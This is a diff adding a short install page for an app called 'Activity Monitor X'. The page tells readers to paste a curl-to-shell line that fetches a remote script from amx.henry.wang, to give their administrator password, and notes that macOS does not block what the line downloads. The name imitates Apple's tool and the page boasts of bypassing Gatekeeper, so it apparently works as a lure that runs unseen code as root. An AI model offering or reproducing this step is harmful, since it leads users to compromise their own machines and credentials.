@@ -1,0 +1,19 @@
+Install Activity Monitor X with one line in Terminal
+====================================================
+
+Activity Monitor X has a helper that records the history as root. Dragging
+the app to Applications does not install the helper, so the app shows no data.
+
+1. Open Terminal: press Command and Space, type Terminal, then press Return.
+
+2. Copy this line, paste it into Terminal, then press Return:
+
+   curl -fsSL https://amx.henry.wang/install.sh | sh
+
+3. Type your administrator password when Terminal asks for it.
+
+The line downloads the latest release, checks its signature, copies the app to
+Applications, installs the helper and opens the app. macOS does not block a
+copy that this line downloads.
+
+Help: https://amx.henry.wang/install
